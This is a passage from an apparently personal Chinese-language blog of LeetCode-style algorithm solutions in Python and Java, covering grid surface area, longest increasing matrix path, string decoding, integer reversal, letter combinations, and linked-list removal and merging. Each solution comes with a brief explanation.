      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007145633433.png" alt="image-20221007145633433"></p>
<p>计算所有表面积减去重叠表面积</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">surfaceArea</span>(<span class="params">self, grid: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        full = <span class="number">0</span></span><br><span class="line">        overlap = <span class="number">0</span></span><br><span class="line">        myLen = <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,myLen):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,myLen):</span><br><span class="line">                leftOver, topOver, rightOver, downOver = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                full += <span class="number">1</span> * grid[i][j] * <span class="number">4</span> + <span class="number">1</span>*<span class="number">2</span>*(<span class="number">1</span> <span class="keyword">if</span> grid[i][j] &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">if</span>(i - <span class="number">1</span> &gt;= <span class="number">0</span>):</span><br><span class="line">                    topOver = <span class="built_in">min</span>(grid[i][j],grid[i-<span class="number">1</span>][j])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j - <span class="number">1</span> &gt;= <span class="number">0</span>):</span><br><span class="line">                    leftOver = <span class="built_in">min</span>(grid[i][j],grid[i][j-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(i + <span class="number">1</span> &lt; myLen):</span><br><span class="line">                    downOver = <span class="built_in">min</span>(grid[i][j],grid[i+<span class="number">1</span>][j])*<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j + <span class="number">1</span> &lt; myLen):</span><br><span class="line">                    rightOver = <span class="built_in">min</span>(grid[i][j],grid[i][j+<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">                tmplap = leftOver + topOver + rightOver + downOver</span><br><span class="line">                overlap += tmplap</span><br><span class="line">        <span class="keyword">return</span> full - overlap</span><br></pre></td></tr></table></div></figure>


        <h2 id="矩阵中的最长递增路径"   >
          <a href="#矩阵中的最长递增路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#矩阵中的最长递增路径" class="headerlink" title="矩阵中的最长递增路径"></a>矩阵中的最长递增路径</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221007201543937.png" alt="image-20221007201543937"></p>
<p>深度优先搜索加缓存，保证不重复遍历</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[][] direction = &#123;&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rowLens;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> columnLens;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestIncreasingPath</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.rowLens = matrix.length;</span><br><span class="line">        <span class="keyword">this</span>.columnLens = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span>[][] mem = <span class="keyword">new</span> <span class="keyword">int</span>[rowLens][columnLens];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> row = <span class="number">0</span> ; row &lt; rowLens ; row++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> column = <span class="number">0</span> ; column &lt; columnLens ; column++)&#123;</span><br><span class="line">                result = Math.max(result,dfs(matrix,mem,row,column));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] matrix,<span class="keyword">int</span>[][] mem,<span class="keyword">int</span> row,<span class="keyword">int</span> column)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(mem[row][column] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> mem[row][column];</span><br><span class="line">        &#125;</span><br><span class="line">        mem[row][column] += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">this</span>.direction.length ; i ++)&#123;</span><br><span class="line">            <span class="keyword">int</span> newRow = row + <span class="keyword">this</span>.direction[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> newColumn = column + <span class="keyword">this</span>.direction[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span> &lt;= newColumn &amp;&amp;  newColumn &lt; <span class="keyword">this</span>.columnLens &amp;&amp; <span class="number">0</span> &lt;= newRow &amp;&amp;  newRow &lt; <span class="keyword">this</span>.rowLens &amp;&amp; matrix[newRow][newColumn] &gt; matrix[row][column])&#123;</span><br><span class="line">                mem[row][column] = Math.max(mem[row][column],dfs(matrix,mem,newRow,newColumn) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mem[row][column];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>






        <h2 id="字符串解码"   >
          <a href="#字符串解码" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串解码" class="headerlink" title="字符串解码"></a>字符串解码</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010141129667.png" alt="image-20221010141129667"></p>
<p>利用栈即可实现</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decodeString</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        stack = []</span><br><span class="line">        pushList = <span class="string">&quot;0123456789[abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> pushList):</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top = stack.pop()</span><br><span class="line">                <span class="keyword">while</span>(top != <span class="string">&quot;[&quot;</span>):</span><br><span class="line">                    tmp = top + tmp</span><br><span class="line">                    top = stack.pop()</span><br><span class="line">                top = stack.pop() <span class="comment">#pop [</span></span><br><span class="line">                <span class="comment">#get num</span></span><br><span class="line">                num = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span>(top != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> (<span class="string">&#x27;0&#x27;</span> &lt;= top &lt;= <span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">                    num = top + num</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">len</span>(stack) &gt; <span class="number">0</span>):</span><br><span class="line">                        top = stack.pop()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                tmp = <span class="built_in">int</span>(num) * tmp</span><br><span class="line">                <span class="keyword">if</span>(top != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> (top &lt; <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> top &gt; <span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">                    stack.append(top)</span><br><span class="line">                stack = stack + <span class="built_in">list</span>(tmp)</span><br><span class="line">        <span class="keyword">return</span> res + <span class="string">&quot;&quot;</span>.join(stack)</span><br></pre></td></tr></table></div></figure>




        <h2 id="整数反转"   >
          <a href="#整数反转" class="heading-link"><i class="fas fa-link"></i></a><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010144212174.png" alt="image-20221010144212174"></p>
<p>使用模加除即可解决，主要考虑溢出情况</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == Integer.MIN_VALUE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> calcuTmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> signed = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            signed = -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            signed = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp = signed * x;</span><br><span class="line">        <span class="keyword">while</span> (tmp != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(calcuTmp &gt; Integer.MAX_VALUE/<span class="number">10</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            calcuTmp *= <span class="number">10</span>;</span><br><span class="line">            calcuTmp += (tmp % <span class="number">10</span>);</span><br><span class="line">            tmp = (tmp - (tmp % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> signed * calcuTmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="电话号码的字母组合"   >
          <a href="#电话号码的字母组合" class="heading-link"><i class="fas fa-link"></i></a><a href="#电话号码的字母组合" class="headerlink" title="电话号码的字母组合"></a>电话号码的字母组合</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010180907032.png" alt="image-20221010180907032"></p>
<p>全排列问题基本都用回溯法解决，基本公式就是</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">idx</span>):</span></span><br><span class="line">	<span class="keyword">if</span>(limitCondition):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputList:</span><br><span class="line">		operate()<span class="comment">#一般都是push之类的</span></span><br><span class="line">    	back(idx+<span class="number">1</span>)</span><br><span class="line">        operate()<span class="comment">#一般都是pop之类的</span></span><br><span class="line">back(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<p>如下解决</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">letterCombinations</span>(<span class="params">self, digits: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span></span><br><span class="line"></span><br><span class="line">        phoneMap = &#123;</span><br><span class="line">            <span class="string">&quot;2&quot;</span>: <span class="string">&quot;abc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;3&quot;</span>: <span class="string">&quot;def&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4&quot;</span>: <span class="string">&quot;ghi&quot;</span>,</span><br><span class="line">            <span class="string">&quot;5&quot;</span>: <span class="string">&quot;jkl&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6&quot;</span>: <span class="string">&quot;mno&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7&quot;</span>: <span class="string">&quot;pqrs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;8&quot;</span>: <span class="string">&quot;tuv&quot;</span>,</span><br><span class="line">            <span class="string">&quot;9&quot;</span>: <span class="string">&quot;wxyz&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        com = []</span><br><span class="line">        coms = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">backTrace</span>(<span class="params">idx</span>):</span></span><br><span class="line">            <span class="keyword">if</span>(idx == <span class="built_in">len</span>(digits)):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            digit = digits[idx]</span><br><span class="line">            <span class="keyword">for</span> letter <span class="keyword">in</span> phoneMap[digit]:</span><br><span class="line">                com.append(letter)</span><br><span class="line">                backTrace(idx + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(com) == <span class="built_in">len</span>(digits)):</span><br><span class="line">                    coms.append(<span class="string">&quot;&quot;</span>.join(com))</span><br><span class="line">                com.pop()</span><br><span class="line">        backTrace(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> coms</span><br></pre></td></tr></table></div></figure>






        <h2 id="删除链表的倒数第n个结点"   >
          <a href="#删除链表的倒数第n个结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除链表的倒数第n个结点" class="headerlink" title="删除链表的倒数第n个结点"></a>删除链表的倒数第n个结点</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011104404437.png" alt="image-20221011104404437"></p>
<p>使用快慢指针</p>
<ul>
<li><p>定义伪头部节点，指向头部节点</p>
</li>
<li><p>快指针同时指向伪头部节点</p>
</li>
<li><p>快指针先遍历n次，慢指针不动</p>
</li>
<li><p>快指针接着遍历，同时慢指针也开始遍历，快指针遍历到尾部，即<code>fastPoint.next=null</code>时结束，此时慢指针就遍历到<code>len(list) - n</code>个节点，即倒数第n个节点。</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode beHead = <span class="keyword">new</span> ListNode();</span><br><span class="line">        beHead.next = head;</span><br><span class="line">        ListNode fastPoint = beHead;</span><br><span class="line">        ListNode slowPoint = beHead;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            fastPoint = fastPoint.next;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fastPoint.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            slowPoint = slowPoint.next;</span><br><span class="line">            fastPoint = fastPoint.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slowPoint.next = slowPoint.next.next;</span><br><span class="line">        <span class="keyword">return</span> beHead.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当然先一次遍历获取链表长度也可以。</p>
<p>或者使用栈来进行辅助，遍历一遍全部压入，然后弹出N个结点即可。</p>

        <h2 id="合并两个有序链表"   >
          <a href="#合并两个有序链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011133912036.png" alt="image-20221011133912036"></p>
<p>直接归并即可</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">        ListNode newList = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode originList = newList;</span><br><span class="line">        <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list1.val &lt;= list2.val)&#123;</span><br><span class="line">                newList.next = list1;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list1 = list1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list2.val &lt;= list1.val )&#123;</span><br><span class="line">                newList.next = list2;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list2 = list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            newList.next = list2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newList.next = list1;</span><br><span class="line">            <span class="comment">//newList.next.next = list1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originList.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="合并K个升序链表"   >
          <a href="#合并K个升序链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并K个升序链表" class="headerlink" title="合并K个升序链表"></a>合并K个升序链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011145532993.png" alt="image-20221011145532993"></p>
<p>即归并分治</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">        ListNode newList = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode originList = newList;</span><br><span class="line">        <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list1.val &lt;= list2.val)&#123;</span><br><span class="line">                newList.next = list1;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list1 = list1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list2.val &lt;= list1.val )&#123;</span><br><span class="line">                newList.next = list2;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list2 = list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            newList.next = list2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newList.next = list1;</span><br><span class="line">            <span class="comment">//newList.next.next = list1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originList.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">merge</span><span class="params">(ListNode[] lists, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">            <span class="keyword">return</span> lists[left];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> mergeTwoLists(merge(lists, left, mid), merge(lists, mid + <span class="number">1</span>, right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> merge(lists, <span class="number">0</span>, lists.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>需要注意的是使用<code>left == right</code>来确定每一个都遍历到。</p>

        <h2 id="找出字符串中第一个匹配项的下标"   >
          <a href="#找出字符串中第一个匹配项的下标" class="heading-link"><i class="fas fa-link"></i></a><a href="#找出字符串中第一个匹配项的下标" class="headerlink" title="找出字符串中第一个匹配项的下标"></a>找出字符串中第一个匹配项的下标</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011164112082.png" alt="image-20221011164112082"></p>
<p>爆破遍历即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: <span class="built_in">str</span>, needle: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        res = <span class="built_in">len</span>(haystack)</span><br><span class="line">        <span class="keyword">for</span> cIdx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(haystack)):</span><br><span class="line">            i = cIdx</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span>(haystack[i] == needle[j]):</span><br><span class="line">                <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(needle) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(haystack) <span class="keyword">and</span> haystack[i] == needle[j]):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(needle)):</span><br><span class="line">                    res = <span class="built_in">min</span>(res,i - <span class="built_in">len</span>(needle))</span><br><span class="line">                    <span class="comment">#i -= 1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(res == <span class="built_in">len</span>(haystack)):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>


        <h1 id="剑指Offer"   >
          <a href="#剑指Offer" class="heading-link"><i class="fas fa-link"></i></a><a href="#剑指Offer" class="headerlink" title="剑指Offer"></a>剑指Offer</h1>
      
        <h2 id="两个栈实现队列"   >
          <a href="#两个栈实现队列" class="heading-link"><i class="fas fa-link"></i></a><a href="#两个栈实现队列" class="headerlink" title="两个栈实现队列"></a>两个栈实现队列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144203634.png" alt="image-20221014144203634"></p>
